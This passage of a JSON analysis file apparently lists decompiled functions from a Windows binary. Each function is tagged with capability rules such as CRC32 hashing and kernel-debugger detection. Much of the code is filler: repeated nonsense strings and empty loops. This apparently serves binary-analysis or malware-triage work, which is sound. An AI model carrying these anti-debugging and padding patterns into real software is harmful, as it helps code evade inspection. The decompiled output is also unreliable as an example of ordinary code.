        "decompiled_code": "\nuint __cdecl fcn.00401ca8(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_d8h;\n    int32_t var_d4h;\n    uint var_d0h;\n    uint var_b8h;\n    int32_t var_a0h;\n    uint var_9ch;\n    uint var_84h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff18;\n    var_14h = 0x450ac0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"somlxcxthdmlpoadflqgdrkmmztspwshvscfgfaeuskbficcazqfbxzb\");\n    var_10h = 1;\n    fcn.00401e79(\"somlxcxthdmlpoadflqgdrkmmztspwshvscfgfaeuskbficcazqfbxzb\");\n    var_10h = 4;\n    fcn.00401e79(\"somlxcxthdmlpoadflqgdrkmmztspwshvscfgfaeuskbficcazqfbxzb\");\n    uVar1 = fcn.004042dc(&var_68h, &var_50h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_6ch = 0x1d; 0 < var_6ch; var_6ch = var_6ch + -1) {\n        }\n    }\n    var_10h = 1;\n    fcn.00401e79(\"somlxcxthdmlpoadflqgdrkmmztspwshvscfgfaeuskbficcazqfbxzb\");\n    var_10h = 3;\n    fcn.00401e79(\"somlxcxthdmlpoadflqgdrkmmztspwshvscfgfaeuskbficcazqfbxzb\");\n    uVar1 = fcn.004042dc(&var_9ch, &var_84h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_a0h = 0x50; 0 < var_a0h; var_a0h = var_a0h + -1) {\n        }\n    }\n    var_10h = 1;\n    fcn.00401e79(\"somlxcxthdmlpoadflqgdrkmmztspwshvscfgfaeuskbficcazqfbxzb\");\n    var_10h = 2;\n    fcn.00401e79(\"somlxcxthdmlpoadflqgdrkmmztspwshvscfgfaeuskbficcazqfbxzb\");\n    uVar1 = fcn.00405b37(&var_d0h, &var_b8h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_d4h = 0x60; 0 < var_d4h; var_d4h = var_d4h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0;\n}\n",
        "token_count": 891
    },
    "00401cd5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00401cd5(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    \n    while( true ) {\n        uVar2 = 0;\n        if (**0x574458 == 0x5f) {\n            *0x574458 = *0x574458 + 1;\n            uVar2 = 0x4000;\n        }\n        uVar1 = **0x574458;\n        if (('@' < uVar1) && (uVar1 < '[')) {\n            uVar3 = uVar2 | 0x8000;\n            uVar4 = **0x574458 - 0x41;\n            *0x574458 = *0x574458 + 1;\n            if ((uVar4 & 1) != 0) {\n                uVar3 = uVar2 | 0xa000;\n            }\n            if (0x17 < uVar4) {\n                return uVar3;\n            }\n            uVar2 = uVar3 | 0x800;\n            uVar6 = uVar4 & 0x18;\n            if (uVar6 == 0) {\n                uVar2 = uVar3 | 0x840;\n            }\n            else if (uVar6 == 8) {\n                uVar2 = uVar3 | 0x880;\n            }\n            else if (uVar6 != 0x10) {\n                return 0xffff;\n            }\n            uVar4 = uVar4 & 6;\n            if (uVar4 != 0) {\n                if (uVar4 == 2) {\n                    return uVar2 | 0x200;\n                }\n                if (uVar4 != 4) {\n                    if (uVar4 != 6) {\n                        return 0xffff;\n                    }\n                    return uVar2 | 0x400;\n                }\n                return uVar2 | 0x100;\n            }\n            return uVar2;\n        }\n        if (uVar1 != 0x24) {\n            if (('/' < uVar1) && (uVar1 < '9')) {\n                *0x574458 = *0x574458 + 1;\n    // switch table (9 cases) at 0x492af3\n                switch(uVar1) {\n                case 0x30:\n                    return 0x800;\n                case 0x31:\n                    return 0x1000;\n                case 0x32:\n                    return 0;\n                case 0x33:\n                    return 0x4000;\n                case 0x34:\n                    return 0x2000;\n                case 0x35:\n                    return 0x6000;\n                case 0x36:\n                    return 0x6800;\n                case 0x37:\n                    return 0x7000;\n                case 0x38:\n                    return 0x7800;\n                default:\n                    return 0xffff;\n                }\n            }\n            if (uVar1 == 0x39) {\n                *0x574458 = *0x574458 + 1;\n                return 0xfffd;\n            }\n            if (uVar1 != 0x3b) {\n                return (uVar1 != 0) + 0xfffe;\n            }\n            *0x574458 = *0x574458 + 1;\n            return 0x6c00;\n        }\n        puVar5 = *0x574458 + 1;\n        uVar1 = *puVar5;\n        if ('5' < uVar1) break;\n        iVar7 = 0;\n        if (uVar1 == 0x35) goto code_r0x004929d4;\n        if (uVar1 == 0) {\n            uVar4 = 0xfffe;\n            puVar5 = *0x574458;\n            goto code_r0x00492a4d;\n        }\n        if (uVar1 != 0x24) {\n            if ((((uVar1 != 0x30) && (uVar1 != 0x31)) && (uVar1 != 0x32)) && ((uVar1 != 0x33 && (uVar1 != 0x34)))) {\n                *0x574458 = puVar5;\n                return 0xffff;\n            }\n            goto code_r0x004929d4;\n        }\n        if ((*0x574458)[2] == 0x50) {\n            puVar5 = *0x574458 + 2;\n        }\n        *0x574458 = puVar5 + 1;\n        uVar1 = **0x574458;\n        if (uVar1 < 'N') {\n            if (uVar1 != 0x4d) {\n                if (uVar1 == 0) {\n                    return 0xfffe;\n                }\n                if ((uVar1 != 0x46) && (uVar1 != 0x48)) {\n                    if (uVar1 == 0x4a) goto code_r0x00492928;\n                    if (uVar1 != 0x4c) {\n                        return 0xffff;\n                    }\n                }\n            }\n        }\n        else {\n            if ((uVar1 == 0x4e) || (uVar1 == 0x4f)) {\ncode_r0x00492928:\n                puVar5 = puVar5 + 2;\n                uVar1 = *puVar5;\n                if (('/' < uVar1) && (uVar1 < ':')) {\n                    *0x574458 = puVar5 + uVar1 + -0x2f;\n                    uVar2 = fcn.00401cd5();\n                    return uVar2 | 0x10000;\n                }\n                uVar4 = 0xffff;\n                goto code_r0x00492a4d;\n            }\n            if (uVar1 != 0x51) {\n                if (uVar1 != 0x68) {\n                    return 0xffff;\n                }\n                *0x57446c = 0;\n            }\n        }\n        *0x574458 = puVar5 + 2;\n    }\n    if (uVar1 == 0x41) {\n        uVar4 = uVar2 | 0x9000;\n        goto code_r0x00492a4d;\n    }\n    if (uVar1 == 0x42) {\n        uVar4 = uVar2 | 0x9800;\n        goto code_r0x00492a4d;\n    }\n    if (uVar1 == 0x43) {\n        uVar4 = 0x7c00;\n        goto code_r0x00492a4d;\n    }\n    if (uVar1 == 0x44) {\n        uVar4 = uVar2 | 0x9100;\n        goto code_r0x00492a4d;\n    }\n    if (uVar1 == 0x45) {\n        uVar4 = uVar2 | 0x9200;\n        goto code_r0x00492a4d;\n    }\n    if (uVar1 != 0x52) {\n        *0x574458 = puVar5;\n        return 0xffff;\n    }\n    puVar5 = *0x574458 + 2;\n    uVar1 = *puVar5;\n    if ((uVar1 < '0') || (iVar7 = 1,  '5' < uVar1)) {\n        *0x574458 = puVar5;\n        return (uVar1 == 0) + 0xfffe;\n    }\ncode_r0x004929d4:\n    *0x574458 = puVar5;\n    uVar2 = (iVar7 + 5) * 0x100 | uVar2;\n    uVar4 = uVar2 | 0x8800;\n    if ((**0x574458 & 1) != 0) {\n        uVar4 = uVar2 | 0xa800;\n    }\n    uVar1 = **0x574458 & 6;\n    puVar5 = *0x574458;\n    if (uVar1 == 0) {\n        uVar4 = uVar4 | 0x40;\n    }\n    else if (uVar1 == 2) {\n        uVar4 = uVar4 | 0x80;\n    }\n    else if (uVar1 != 4) {\n        return 0xffff;\n    }\ncode_r0x00492a4d:\n    *0x574458 = puVar5 + 1;\n    return uVar4;\n}\n",
        "token_count": 1930
    },
    "00401d07": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401d07(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.00403120();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.00402513(0x18, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406640();\n            uVar4 = fcn.00404714(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::numpunct_unsigned_short_int_.0;\n            fcn.00405d8a(uVar4, 1);\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fff();\n        }\n    }\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 408
    },
    "00401d0c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401d0c(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack192;\n    uchar auStack188 [24];\n    uchar auStack164 [24];\n    int32_t iStack140;\n    uchar auStack136 [24];\n    uchar auStack112 [24];\n    uint uStack88;\n    uint uStack84;\n    uchar uStack77;\n    uint uStack76;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff30;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451360;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40d14300;\n    uStack48 = 0;\n    fcn.00401e79(\"vagmbiqdpnpxcpk\");\n    uStack76 = 0x10;\n    uStack77 = 1;\n    uStack84 = 0x40d31ec0;\n    uStack88 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"vagmbiqdpnpxcpk\");\n    uStack24 = 2;\n    fcn.00401e79(\"vagmbiqdpnpxcpk\");\n    uVar1 = fcn.004042dc(auStack136, auStack112);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack140 = 10; 0 < iStack140; iStack140 = iStack140 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"vagmbiqdpnpxcpk\");\n    uStack24 = 1;\n    fcn.00401e79(\"vagmbiqdpnpxcpk\");\n    uVar1 = fcn.00405b37(auStack188, auStack164);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack192 = 0x4c; 0 < iStack192; iStack192 = iStack192 + -1) {\n        }\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x133ad;\n}\n",
        "token_count": 612
    },
    "00401d75": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00401d75(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack284;\n    uchar auStack280 [24];\n    uchar auStack256 [24];\n    int32_t iStack232;\n    uchar auStack228 [24];\n    uchar auStack204 [75];\n    uchar uStack129;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uchar uStack81;\n    uint uStack80;\n    uint uStack76;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffec8;\n    uStack28 = 0x451720;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40b7b000;\n    uStack48 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"ekrtznfoihpstgbiy\");\n    uStack76 = 0x40e23520;\n    uStack80 = 0;\n    uStack81 = 1;\n    uStack24 = 2;\n    fcn.00401e79(\"wtllpqjcadusaeemgxpndmwx\");\n    uStack116 = 0x40cb1600;\n    uStack120 = 0;\n    uStack124 = 0x40ea9e60;\n    uStack128 = 0;\n    uStack129 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"yqlgk\");\n    uStack24 = 4;\n    fcn.00401e79(\"qmhveiqvdxqrosymgbpunsocjwmcnsedbzjnhnwsfnoygekqnshxlvnclrmusgcgfthg\");\n    uStack24 = 5;\n    fcn.00401e79(\"yqlgk\");\n    uStack24 = 7;\n    fcn.00401e79(\"yqlgk\");\n    uVar1 = fcn.00405b37(auStack228, auStack204);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack232 = 0x2b; 0 < iStack232; iStack232 = iStack232 + -1) {\n        }\n    }\n    uStack24 = 5;\n    fcn.00401e79(\"yqlgk\");\n    uStack24 = 6;\n    fcn.00401e79(\"yqlgk\");\n    uVar1 = fcn.00405b37(auStack280, auStack256);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack284 = 0x2a; 0 < iStack284; iStack284 = iStack284 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 811
    },
    "00401df7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401df7(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t var_28h;\n    uint lpNumberOfBytesWritten;\n    uint uStack36;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    char *lpBuffer;\n    int32_t var_8h;\n    uint32_t nNumberOfBytesToWrite;\n    \n    nNumberOfBytesToWrite = arg_10h;\n    lpBuffer = arg_ch;\n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_ch == NULL) {\ncode_r0x004d19ff:\n        puVar3 = fcn.0040185c();\n        *puVar3 = 0;\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n        return -1;\n    }\n    var_10h = arg_8h >> 6;\n    var_8h = (arg_8h & 0x3f) * 0x38;\n    iVar5 = *(var_10h * 4 + 0x575220);\n    cVar1 = *(iVar5 + 0x29 + var_8h);\n    if (((cVar1 == '\\x02') || (cVar1 == '\\x01')) && ((~arg_10h & 1) == 0)) goto code_r0x004d19ff;\n    if ((*(iVar5 + 0x28 + var_8h) & 0x20) != 0) {\n        fcn.00401933(arg_8h, 0, 0, 2);\n    }\n    cVar2 = fcn.004d1457(arg_8h);\n    if (cVar2 == '\\0') {\n        iVar5 = *(var_10h * 4 + 0x575220);\n        if (*(iVar5 + 0x28 + var_8h) < '\\0') {\n            if (cVar1 == '\\0') {\n                piVar4 = fcn.004d14e4(&var_28h, arg_8h, arg_ch, nNumberOfBytesToWrite);\n            }\n            else if (cVar1 == '\\x01') {\n                piVar4 = fcn.004d1718(&var_28h, arg_8h, arg_ch, nNumberOfBytesToWrite);\n            }\n            else {\n                if (cVar1 != '\\x02') goto code_r0x004d1b76;\n                piVar4 = fcn.004d15f5(&var_28h, arg_8h, arg_ch, nNumberOfBytesToWrite);\n            }\n        }\n        else {\n            var_28h = 0;\n            lpNumberOfBytesWritten = 0;\n            uStack36 = 0;\n            iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                              (*(iVar5 + 0x18 + var_8h), lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n            if (iVar5 == 0) {\n                var_28h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            piVar4 = &var_28h;\n        }\n    }\n    else if (cVar1 == '\\0') {\n        piVar4 = fcn.004d0f3e(&var_28h, arg_8h, arg_ch, nNumberOfBytesToWrite);\n    }\n    else {\n        if (1 < cVar1 - 1U) goto code_r0x004d1b76;\n        piVar4 = fcn.004d13d5(&var_28h, arg_ch, nNumberOfBytesToWrite);\n    }\n    var_1ch = *piVar4;\n    var_18h = piVar4[1];\n    var_14h = piVar4[2];\n    if (var_18h != 0) {\n        return var_18h - var_14h;\n    }\n    arg_ch = lpBuffer;\n    if (var_1ch != 0) {\n        if (var_1ch == 5) {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 9;\n            puVar3 = fcn.0040185c();\n            *puVar3 = 5;\n            return -1;\n        }\n        fcn.00404b9c(var_1ch);\n        return -1;\n    }\ncode_r0x004d1b76:\n    if (((*(*(var_10h * 4 + 0x575220) + 0x28 + var_8h) & 0x40) != 0) && (*arg_ch == '\\x1a')) {\n        return 0;\n    }\n    puVar3 = fcn.00403a35();\n    *puVar3 = 0x1c;\n    puVar3 = fcn.0040185c();\n    *puVar3 = 0;\n    return -1;\n}\n",
        "token_count": 1178
    },
    "00401e06": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00401e06(uint *param_1)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004028d8();\n    var_8h = param_1;\n    if ((uVar1 & 1) != 0) {\n        var_8h = fcn.00405290(*param_1);\n    }\n    return var_8h;\n}\n",
        "token_count": 113
    },
    "00401e15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401e15(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack160;\n    int32_t iStack156;\n    uchar auStack152 [24];\n    uchar auStack128 [24];\n    uint uStack104;\n    uint uStack100;\n    uchar uStack90;\n    uchar uStack89;\n    uint uStack88;\n    uint uStack84;\n    uint uStack76;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff48;\n    uStack28 = 0x451120;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x1755;\n    uStack48 = 0x750;\n    uStack24 = 1;\n    fcn.00401e79(\"onhgngyefcyliblhvgpityrrfqzpaxzdxouhoxuhpusaaonynrujxxmeese\");\n    uStack76 = 0x1250;\n    uStack84 = 0x40d41fc0;\n    uStack88 = 0;\n    uStack89 = 0;\n    uStack90 = 0;\n    uStack100 = 0x40e881a0;\n    uStack104 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"onhgngyefcyliblhvgpityrrfqzpaxzdxouhoxuhpusaaonynrujxxmeese\");\n    uStack24 = 3;\n    fcn.00401e79(\"onhgngyefcyliblhvgpityrrfqzpaxzdxouhoxuhpusaaonynrujxxmeese\");\n    uVar1 = fcn.00405b37(auStack152, auStack128);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack156 = 0x1c; 0 < iStack156; iStack156 = iStack156 + -1) {\n        }\n    }\n    for (iStack160 = 0x2a; 0 < iStack160; iStack160 = iStack160 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x7ca9;\n}\n",
        "token_count": 619
    },
    "00401e88": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00401e88(uint arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_1h;\n    \n    var_1h._0_1_ = false;\n    if (arg_ch == arg_14h) {\n        iVar1 = fcn.004033a0(arg_8h, arg_10h, arg_ch);\n        var_1h._0_1_ = iVar1 == 0;\n    }\n    return var_1h._0_1_;\n}\n",
        "token_count": 159
    },
    "00401ef1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401ef1(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450800;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"emhylyegigmqbhioexvryqfxlyqktlewvqzcjzelymblywvwqlxyajnwyizoyrdbncbxembeeyxdhn\");\n    uStack24 = 1;\n    fcn.00401e79(\"ssaawhtof\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 226
    },
    "00401ef6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool __fastcall fcn.00401ef6(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0040458e(param_1);\n    return iVar1 == 0;\n}\n",
        "token_count": 72
    },
    "00401f6e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00401f6e(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uStack12;\n    \n    if (arg_10h == 0x3000) {\n        uStack12 = 0xd;\n    }\n    else if ((SBORROW4(arg_ch, arg_8h == 0) != false) == arg_ch - (arg_8h == 0) < 0) {\n        uStack12 = arg_8h;\n    }\n    else if ((arg_8h | arg_ch) == 0) {\n        if (arg_10h == 0) {\n            uStack12 = 1;\n        }\n        else {\n            uStack12 = 0;\n        }\n    }\n    else {\n        uStack12 = 6;\n    }\n    return CONCAT44(arg_10h, uStack12);\n}\n",
        "token_count": 203
    },
    "00401fdc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool __fastcall fcn.00401fdc(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00402a27(param_1);\n    return iVar1 == 0;\n}\n",
        "token_count": 71
    },
    "00401feb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401feb(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_60h;\n    uchar var_45h;\n    uint var_44h;\n    uchar var_3dh;\n    uint var_3ch;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff70;\n    var_14h = 0x450540;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = 0x13bc;\n    var_10h = 0;\n    fcn.00401e79(\"skyhrea\");\n    var_3dh = 0;\n    var_44h = 0x238;\n    var_45h = 0;\n    var_10h = 1;\n    fcn.00401e79(\"skyhrea\");\n    var_10h = 2;\n    fcn.00401e79(\"skyhrea\");\n    uVar1 = fcn.004042dc(&var_78h, &var_60h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_7ch = 0x51; 0 < var_7ch; var_7ch = var_7ch + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 420
    },
    "00401ff0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00401ff0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x427280;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.00404f61(arg_ch);\n    *in_ECX = vtable.std::numpunct_char_.0;\n    var_10h = 0;\n    fcn.00405b28(arg_8h, arg_10h & 1);\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 211
    },
    "004020e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.004020e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000020;\n    int32_t iStack160;\n    uchar auStack156 [24];\n    uchar auStack132 [24];\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uchar uStack89;\n    uint8_t uStack58;\n    uint8_t uStack57;\n    ulong uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff48;\n    uStack48 = CONCAT44(in_stack_00000020, arg_20h);\n    uStack56 = CONCAT44(noname_4, arg_14h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450c20;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack57 = arg_10h & 1;\n    uStack58 = arg_ch & 1;\n    fcn.00401e79(\"iinkrxdtgbvxgmtqiwcekjnjshctscizntqhmxlmidyjkuaqxrfdyevxqezedgd\");\n    uStack89 = 0;\n    uStack100 = 0x40ceea00;\n    uStack104 = 0;\n    uStack108 = 0x91;\n    uStack24 = 0;\n    fcn.00401e79(\"iinkrxdtgbvxgmtqiwcekjnjshctscizntqhmxlmidyjkuaqxrfdyevxqezedgd\");\n    uStack24 = 1;\n    fcn.00401e79(\"iinkrxdtgbvxgmtqiwcekjnjshctscizntqhmxlmidyjkuaqxrfdyevxqezedgd\");\n    uVar1 = fcn.004042dc(auStack156, auStack132);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack160 = 0x1e; 0 < iStack160; iStack160 = iStack160 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"pmgjqntgokat\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 643
    },
    "004020fe": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
